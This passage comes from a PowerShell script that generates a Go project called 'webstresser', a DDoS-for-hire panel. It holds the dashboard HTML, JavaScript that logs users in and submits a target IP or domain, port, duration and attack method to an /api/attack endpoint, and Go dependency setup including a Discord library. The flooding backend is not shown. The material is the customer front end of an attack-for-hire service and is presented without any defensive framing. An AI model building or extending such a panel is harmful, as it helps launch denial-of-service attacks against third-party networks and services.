                <p><span id="active-attacks">0</span> / <span id="max-concurrents">0</span></p>
            </div>
            <div class="info-box">
                <h3>Max Time</h3>
                <p><span id="max-time">0</span>s</p>
            </div>
            <div class="info-box">
                <h3>Cooldown</h3>
                <p><span id="cooldown">0</span>s</p>
            </div>
        </div>

        <form id="attack-form">
            <h2>Launch Attack</h2>
            <div class="form-group">
                <label for="target">Target (IP or Domain)</label>
                <input type="text" id="target" required>
            </div>
            <div class="form-group">
                <label for="port">Port</label>
                <input type="number" id="port" min="1" max="65535" required>
            </div>
            <div class="form-group">
                <label for="duration">Duration (seconds)</label>
                <input type="number" id="duration" min="1" required>
            </div>
            <div class="form-group">
                <label for="method">Method</label>
                <select id="method" required>
                    <option value="">Loading methods...</option>
                </select>
            </div>
            <button type="submit" id="launch-btn" class="btn">Launch</button>
        </form>
        <div id="error-message"></div>
        <button id="logout-btn" class="btn">Logout</button>
    </div>

    <script src="/js/main.js"></script>
</body>
</html>
'@

$files["www/js/main.js"] = @'
document.addEventListener('DOMContentLoaded', () => {
    const path = window.location.pathname;

    if (path.includes('login.html')) {
        handleLoginPage();
    } else if (path.includes('dashboard.html')) {
        handleDashboardPage();
    }
});

function getAuthToken() {
    return localStorage.getItem('jwt_token');
}

function displayError(message) {
    const errorDiv = document.getElementById('error-message');
    if (errorDiv) {
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
    }
}

function handleLoginPage() {
    const loginForm = document.getElementById('login-form');
    if (loginForm) {
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password }),
                });

                const data = await response.json();

                if (response.ok) {
                    localStorage.setItem('jwt_token', data.token);
                    window.location.href = '/dashboard.html';
                } else {
                    displayError(data.error || 'Login failed.');
                }
            } catch (error) {
                displayError('An error occurred. Please try again.');
            }
        });
    }
}

function handleDashboardPage() {
    const token = getAuthToken();
    if (!token) {
        window.location.href = '/login.html';
        return;
    }

    const headers = {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json',
    };

    const attackForm = document.getElementById('attack-form');
    const launchBtn = document.getElementById('launch-btn');
    const logoutBtn = document.getElementById('logout-btn');

    async function fetchDashboardInfo() {
        try {
            const response = await fetch('/api/dashboard/info', { headers });
            if (response.status === 401) {
                localStorage.removeItem('jwt_token');
                window.location.href = '/login.html';
                return;
            }
            const data = await response.json();
            document.getElementById('user-email').textContent = data.email;
            document.getElementById('plan-name').innerHTML = `${data.plan_name} ${data.is_vip ? '<span class="vip-badge">(VIP)</span>' : ''}`;
            document.getElementById('active-attacks').textContent = data.active_attacks;
            document.getElementById('max-concurrents').textContent = data.max_concurrents;
            document.getElementById('max-time').textContent = data.max_time;
            document.getElementById('cooldown').textContent = data.cooldown;
            
            const durationInput = document.getElementById('duration');
            if(durationInput) durationInput.max = data.max_time;

        } catch (error) {
            console.error('Failed to fetch dashboard info:', error);
        }
    }

    async function fetchMethods() {
        try {
            const response = await fetch('/api/methods', { headers });
            const data = await response.json();
            const methodSelect = document.getElementById('method');
            methodSelect.innerHTML = '<option value="">Select a method</option>';
            for (const method in data) {
                const option = document.createElement('option');
                option.value = method;
                option.textContent = method;
                methodSelect.appendChild(option);
            }
        } catch (error) {
            console.error('Failed to fetch methods:', error);
        }
    }

    if (attackForm) {
        attackForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            launchBtn.disabled = true;
            launchBtn.textContent = 'Launching...';
            document.getElementById('error-message').style.display = 'none';

            const attackData = {
                target: document.getElementById('target').value,
                port: parseInt(document.getElementById('port').value, 10),
                duration: parseInt(document.getElementById('duration').value, 10),
                method: document.getElementById('method').value,
            };

            try {
                const response = await fetch('/api/attack', {
                    method: 'POST',
                    headers,
                    body: JSON.stringify(attackData),
                });
                const result = await response.json();
                if (response.ok) {
                    alert('Attack launched successfully!');
                    fetchDashboardInfo();
                } else {
                    displayError(result.error || 'Failed to launch attack.');
                }
            } catch (error) {
                displayError('An error occurred.');
            } finally {
                launchBtn.disabled = false;
                launchBtn.textContent = 'Launch';
            }
        });
    }

    if (logoutBtn) {
        logoutBtn.addEventListener('click', () => {
            localStorage.removeItem('jwt_token');
            window.location.href = '/login.html';
        });
    }

    fetchDashboardInfo();
    fetchMethods();
    setInterval(fetchDashboardInfo, 10000);
}
'@

# Write Files
foreach ($file in $files.Keys) {
    $path = $file
    $content = $files[$file]
    Set-Content -Path $path -Value $content -Encoding UTF8
    Write-Host "Created $path"
}

# Initialize Go Module
if (!(Test-Path "go.mod")) {
    Write-Host "Initializing Go module..." -ForegroundColor Yellow
    cmd /c "go mod init webstresser"
    cmd /c "go get github.com/go-sql-driver/mysql"
    cmd /c "go get github.com/jmoiron/sqlx"
    cmd /c "go get golang.org/x/crypto/bcrypt"
    cmd /c "go get github.com/golang-jwt/jwt/v4"
    cmd /c "go get github.com/gorilla/mux"
    cmd /c "go get github.com/bwmarrin/discordgo"
    cmd /c "go get github.com/joho/godotenv"
    cmd /c "go mod tidy"
} else {
    Write-Host "go.mod already exists, skipping init."
}

Write-Host "Setup complete! You can now run 'go run main.go'" -ForegroundColor Green